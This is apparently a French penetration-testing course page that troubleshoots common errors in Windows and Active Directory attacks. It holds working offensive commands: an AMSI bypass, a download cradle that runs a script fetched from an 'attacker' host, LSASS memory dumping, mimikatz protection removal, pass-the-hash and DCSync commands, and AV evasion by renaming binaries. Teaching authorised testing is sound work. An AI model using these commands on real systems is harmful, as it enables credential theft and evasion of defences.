---
tags:
  - formation
  - security
  - troubleshooting
  - debugging
  - common-errors
---

# Troubleshooting Guide - Erreurs Courantes

Guide des erreurs fréquemment rencontrées lors des tests d'intrusion Windows/AD et leurs solutions.

---

## 1. Erreurs Réseau & Connectivité

### 1.1 "Connection Refused" / "No Route to Host"

**Symptôme :** Impossible de se connecter à un service.

```bash
# Diagnostic
nmap -Pn -p 445 10.0.0.10
ping 10.0.0.10
traceroute 10.0.0.10
```

**Solutions :**

| Cause | Solution |
|-------|----------|
| Firewall bloque | Vérifier les règles, tester depuis un autre segment |
| Service arrêté | Vérifier avec `nmap -sV` |
| Mauvaise route | Vérifier `ip route`, configurer pivoting |
| VPN/Tunnel down | Reconnecter, vérifier `ip addr` |

### 1.2 "Access Denied" SMB

**Symptôme :** `smbclient` ou `crackmapexec` retourne "Access Denied".

```bash
# Erreur typique
crackmapexec smb 10.0.0.10 -u user -p 'Password123'
SMB  10.0.0.10  445  DC01  [-] CORP\user:Password123 STATUS_LOGON_FAILURE
```

**Solutions :**

```bash
# Vérifier le format du domaine
crackmapexec smb 10.0.0.10 -u user -p 'Pass' -d CORP
crackmapexec smb 10.0.0.10 -u CORP\\user -p 'Pass'
crackmapexec smb 10.0.0.10 -u user@corp.local -p 'Pass'

# Vérifier si compte verrouillé
crackmapexec smb 10.0.0.10 -u user -p 'Pass' 2>&1 | grep -i lock

# Tester avec hash au lieu de password
crackmapexec smb 10.0.0.10 -u user -H 'aad3b435...:32ed87...'

# Vérifier SMB signing
crackmapexec smb 10.0.0.10 --gen-relay-list relay.txt
```

### 1.3 Kerberos Clock Skew

**Symptôme :** `KRB_AP_ERR_SKEW` lors d'authentification Kerberos.

```bash
# Erreur
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

**Solutions :**

```bash
# Synchroniser l'heure avec le DC
sudo ntpdate 10.0.0.10
# ou
sudo rdate -n 10.0.0.10

# Vérifier le décalage
date
crackmapexec smb 10.0.0.10 -u '' -p '' 2>&1 | grep -i time

# Configuration permanente
echo "server 10.0.0.10 iburst" >> /etc/ntp.conf
sudo systemctl restart ntp
```

### 1.4 DNS Resolution Failed

**Symptôme :** Impossible de résoudre les noms de domaine.

```bash
# Erreur
[-] Could not resolve: dc01.corp.local
```

**Solutions :**

```bash
# Ajouter le DC comme DNS
echo "nameserver 10.0.0.10" | sudo tee /etc/resolv.conf

# Ou éditer /etc/hosts
echo "10.0.0.10 dc01.corp.local dc01" | sudo tee -a /etc/hosts

# Vérifier
nslookup dc01.corp.local 10.0.0.10
host corp.local 10.0.0.10
```

---

## 2. Erreurs d'Authentification

### 2.1 NTLM Hash Format Incorrect

**Symptôme :** "Invalid hash format" avec Pass-the-Hash.

```bash
# Erreur
[-] Invalid NT hash specified
```

**Solutions :**

```bash
# Format correct: LM:NT (32:32 caractères hex)
# Si pas de LM hash, utiliser des zéros
crackmapexec smb 10.0.0.10 -u admin -H 'aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cdb30ab...'

# Ou juste le NT hash (certains outils)
crackmapexec smb 10.0.0.10 -u admin -H '32ed87bdb5fdc5e9cdb30ab...'

# Vérifier le hash
echo -n "32ed87bdb5fdc5e9cdb30ab9675d98cd" | wc -c
# Doit retourner 32
```

### 2.2 Kerberos Pre-Authentication Failed

**Symptôme :** Échec d'authentification Kerberos.

```bash
# Erreur
[-] KDC_ERR_PREAUTH_FAILED
```

**Solutions :**

```bash
# Vérifier le mot de passe
# Attention aux caractères spéciaux
impacket-getTGT 'corp.local/user:P@ss!word'
impacket-getTGT 'corp.local/user:P@ss\!word'  # Escape si nécessaire

# Vérifier le SPN format
impacket-getTGT 'corp.local/user' -hashes :32ed87...

# Vérifier si compte désactivé
ldapsearch -x -H ldap://10.0.0.10 -D "user@corp.local" -w 'pass' -b "dc=corp,dc=local" "(sAMAccountName=user)" userAccountControl
```

### 2.3 Pass-the-Ticket Échoue

**Symptôme :** Ticket Kerberos non accepté.

```bash
# Erreur
[-] Kerberos SessionError: KRB_AP_ERR_TKT_EXPIRED
```

**Solutions :**

```bash
# Vérifier expiration du ticket
klist

# Exporter un nouveau ticket
impacket-getTGT 'corp.local/user:password' -dc-ip 10.0.0.10

# Importer correctement
export KRB5CCNAME=/tmp/user.ccache

# Vérifier le fichier krb5.conf
cat /etc/krb5.conf
# Doit contenir le realm et le KDC

# Exemple krb5.conf
[libdefaults]
    default_realm = CORP.LOCAL

[realms]
    CORP.LOCAL = {
        kdc = dc01.corp.local
        admin_server = dc01.corp.local
    }

[domain_realm]
    .corp.local = CORP.LOCAL
    corp.local = CORP.LOCAL
```

---

## 3. Erreurs d'Outils

### 3.1 Impacket - Erreurs Courantes

**"[Errno 104] Connection reset by peer"**

```bash
# Cause: SMB signing required
# Solution: Utiliser Kerberos ou trouver une cible sans signing

impacket-psexec -k -no-pass corp.local/user@dc01.corp.local
```

**"DCERPC Runtime Error"**

```bash
# Cause: RPC non disponible ou bloqué
# Solution: Vérifier le port 135 et dynamic ports

nmap -p 135,49152-65535 10.0.0.10
```

**"STATUS_ACCESS_DENIED" avec secretsdump**

```bash
# Causes possibles:
# 1. Pas admin du domaine
# 2. UAC remote restrictions

# Solution 1: Vérifier les droits
crackmapexec smb 10.0.0.10 -u user -p pass --groups

# Solution 2: Utiliser le DC directement
impacket-secretsdump 'corp.local/admin:pass@dc01.corp.local'
```

### 3.2 BloodHound - Problèmes de Collection

**SharpHound bloque / timeout**

```powershell
# Cause: AV/EDR détecte SharpHound
# Solutions:

# 1. Utiliser une version obfusquée
# 2. Collecter par morceaux
.\SharpHound.exe -c Session --Loop --LoopDuration 00:05:00

# 3. Utiliser bloodhound-python depuis Linux
bloodhound-python -u user -p pass -d corp.local -c All -ns 10.0.0.10
```

**Erreur d'import dans Neo4j**

```bash
# Cause: Format JSON incompatible
# Solution: Vérifier la version de BloodHound

# Nettoyer la base
MATCH (n) DETACH DELETE n

# Réimporter avec la bonne version
```

### 3.3 Mimikatz - Erreurs Courantes

**"ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory"**

```powershell
# Cause: Privilèges insuffisants ou process protection
# Solutions:

# 1. Vérifier les privilèges
privilege::debug

# 2. Si LSA Protection activée
!+   # Charger le driver mimidrv
!processprotect /process:lsass.exe /remove

# 3. Alternative: dump offline
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\temp\lsass.dmp full
```

**"ERROR kuhl_m_sekurlsa_pth ; CreateProcessAsUser"**

```powershell
# Cause: SeDebugPrivilege manquant
# Solution: Élever en admin puis activer

privilege::debug
sekurlsa::pth /user:admin /domain:corp /ntlm:...
```

### 3.4 Rubeus - Erreurs Courantes

**"[X] Error 0x6 - bad password"**

```powershell
# Le mot de passe/hash est incorrect
# Vérifier le format et le domaine

# Avec password
Rubeus.exe asktgt /user:user /password:pass /domain:corp.local

# Avec hash (format correct)
Rubeus.exe asktgt /user:user /rc4:32ed87bdb5fdc... /domain:corp.local
```

**"[X] KDC_ERR_S_PRINCIPAL_UNKNOWN"**

```powershell
# Le SPN demandé n'existe pas
# Vérifier avec setspn ou LDAP

setspn -L serviceaccount
# ou
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

---

## 4. Erreurs PowerShell

### 4.1 Execution Policy

**"cannot be loaded because running scripts is disabled"**

```powershell
# Solutions (par ordre de préférence)

# 1. Bypass inline
powershell -ep bypass -file script.ps1

# 2. Pour la session
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

# 3. Via download cradle (évite le fichier)
IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')
```

### 4.2 AMSI Block

**"This script contains malicious content"**

```powershell
# L'AMSI a détecté le script
# Solutions:

# 1. AMSI bypass (versions changent souvent)
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 2. Obfuscation
Invoke-Obfuscation

# 3. Utiliser des outils compilés (.exe) au lieu de PowerShell
```

### 4.3 Constrained Language Mode

**"Cannot invoke method. Method invocation is supported only on core types"**

```powershell
# PowerShell est en mode restreint
# Vérifier:
$ExecutionContext.SessionState.LanguageMode

# Solutions:
# 1. Trouver une AppLocker bypass
# 2. Utiliser des binaires compilés
# 3. Downgrade PowerShell v2 (si disponible)
powershell -version 2

# 4. Utiliser des LOLBins
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ...")
```

---

## 5. Erreurs Active Directory

### 5.1 Kerberoasting - Pas de Hash

**Symptôme :** GetUserSPNs ne retourne rien.

```bash
# Diagnostic
impacket-GetUserSPNs 'corp.local/user:pass' -dc-ip 10.0.0.10
# No entries found!
```

**Solutions :**

```bash
# Vérifier qu'il y a des comptes avec SPN
ldapsearch -x -H ldap://10.0.0.10 -D "user@corp.local" -w 'pass' \
  -b "dc=corp,dc=local" "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Vérifier les permissions de lecture
# Certains SPNs peuvent être cachés
```

### 5.2 DCSync - Access Denied

**Symptôme :** secretsdump échoue avec access denied.

```bash
# Erreur
[-] DRSR SessionError: code: 0x2105
```

**Solutions :**

```bash
# Vérifier les droits DCSync
# Nécessite: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

# Via BloodHound - chercher les droits DCSync
# Via LDAP - vérifier les ACLs sur le domaine

# Alternative: dump NTDS.dit physiquement
impacket-secretsdump -ntds ntds.dit -system SYSTEM local
```

### 5.3 Delegation Attack Échoue

**Symptôme :** S4U2Self/S4U2Proxy ne fonctionne pas.

```bash
# Erreur
[-] Kerberos SessionError: KDC_ERR_BADOPTION
```

**Solutions :**

```bash
# Vérifier le type de délégation
Get-ADComputer -Filter * -Properties TrustedForDelegation,TrustedToAuthForDelegation,msDS-AllowedToDelegateTo

# Pour Constrained Delegation
# - Vérifier que le SPN cible est dans msDS-AllowedToDelegateTo
# - Vérifier TrustedToAuthForDelegation pour Protocol Transition

# Pour RBCD
# - Vérifier msDS-AllowedToActOnBehalfOfOtherIdentity
# - S'assurer d'avoir un compte avec SPN contrôlé
```

---

## 6. Erreurs Pivoting

### 6.1 Chisel - Connection Failed

**Symptôme :** Le client Chisel ne se connecte pas.

```bash
# Vérifier que le serveur écoute
ss -tlnp | grep 8080

# Vérifier le firewall
iptables -L -n | grep 8080

# Sur Windows, vérifier que le binaire n'est pas bloqué
# Renommer le binaire: update.exe au lieu de chisel.exe
```

### 6.2 Ligolo-ng - No Route

**Symptôme :** Pas de connectivité après setup Ligolo.

```bash
# Vérifier l'interface tun
ip addr show ligolo

# Vérifier la route
ip route | grep ligolo

# Ajouter la route manuellement
sudo ip route add 10.0.0.0/24 dev ligolo

# Vérifier le forwarding
cat /proc/sys/net/ipv4/ip_forward
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 6.3 SSH Tunnel - Permission Denied

**Symptôme :** Port forwarding SSH échoue.

```bash
# Vérifier la configuration SSH serveur
grep -E "AllowTcpForwarding|GatewayPorts" /etc/ssh/sshd_config

# Doit être:
AllowTcpForwarding yes
GatewayPorts yes  # Si besoin d'écouter sur 0.0.0.0

# Privilèges pour ports < 1024
sudo ssh -L 80:target:80 user@pivot
# ou utiliser un port > 1024
ssh -L 8080:target:80 user@pivot
```

---

## 7. Debugging Général

### 7.1 Verbose Mode

```bash
# Impacket
impacket-secretsdump -debug 'corp.local/admin:pass@dc01'

# CrackMapExec
crackmapexec smb 10.0.0.10 -u user -p pass --verbose

# Bloodhound-python
bloodhound-python -v -u user -p pass -d corp.local

# Responder
responder -I eth0 -v

# PowerShell
$VerbosePreference = "Continue"
```

### 7.2 Network Captures

```bash
# Capturer le trafic pour debug
sudo tcpdump -i eth0 -w capture.pcap host 10.0.0.10

# Filtrer par protocole
sudo tcpdump -i eth0 port 445 or port 88 or port 389

# Analyser avec Wireshark
wireshark capture.pcap &
# Filtrer: kerberos || smb2 || ldap
```

### 7.3 Logs Windows

```powershell
# Vérifier les erreurs côté cible (si accès)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 10 |
    Select-Object TimeCreated, Message

# Kerberos errors
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4768,4769,4771} -MaxEvents 10
```

---

## 8. Quick Reference - Codes d'Erreur

### 8.1 Kerberos

| Code | Signification |
|------|---------------|
| KRB_AP_ERR_SKEW | Clock skew > 5 minutes |
| KDC_ERR_PREAUTH_FAILED | Mauvais password |
| KDC_ERR_C_PRINCIPAL_UNKNOWN | User n'existe pas |
| KDC_ERR_S_PRINCIPAL_UNKNOWN | Service n'existe pas |
| KDC_ERR_POLICY | Policy violation (lockout, hours) |

### 8.2 NTLM/SMB

| Code | Signification |
|------|---------------|
| STATUS_LOGON_FAILURE | Auth failed |
| STATUS_ACCOUNT_DISABLED | Compte désactivé |
| STATUS_ACCOUNT_LOCKED_OUT | Compte verrouillé |
| STATUS_PASSWORD_EXPIRED | Password expiré |
| STATUS_ACCESS_DENIED | Pas les droits |

### 8.3 LDAP

| Code | Signification |
|------|---------------|
| 49 | Invalid credentials |
| 52e | Wrong password |
| 530 | Not permitted at this time |
| 532 | Password expired |
| 533 | Account disabled |
| 701 | Account expired |
| 775 | Account locked |

---

[Retour au Programme](index.md){ .md-button }
[Certifications →](certifications.md){ .md-button .md-button--primary }
